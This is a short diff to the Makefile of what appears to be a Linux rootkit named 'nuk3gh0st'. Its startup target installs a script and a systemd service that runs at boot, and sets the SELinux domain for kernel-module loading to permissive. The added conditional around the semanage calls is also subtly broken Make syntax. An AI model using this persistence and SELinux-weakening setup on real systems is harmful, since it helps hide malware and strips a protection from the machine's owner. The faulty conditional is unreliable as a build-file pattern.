@@ -17,13 +17,17 @@ startup:
 	cp nuk3gh0st.startup /usr/lib/nuk3gh0st.startup
 	chmod +x /usr/lib/nuk3gh0st.startup
 	cp nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
-	semanage permissive -a insmod_t
+	ifneq ("$(wildcard $(/usr/sbin/semanage))","")
+		semanage permissive -a insmod_t
+	endif
 	systemctl enable nuk3gh0st.service
 	service nuk3gh0st start
 clean-startup:
 	systemctl disable nuk3gh0st.service
 	service nuk3gh0st stop
-	semanage permissive -d insmod_t
+	ifneq ("$(wildcard $(/usr/sbin/semanage))","")
+		semanage permissive -d insmod_t
+	endif
 	rm /usr/lib/nuk3gh0st.startup
 	rm /lib/systemd/system/nuk3gh0st.service
 clean:
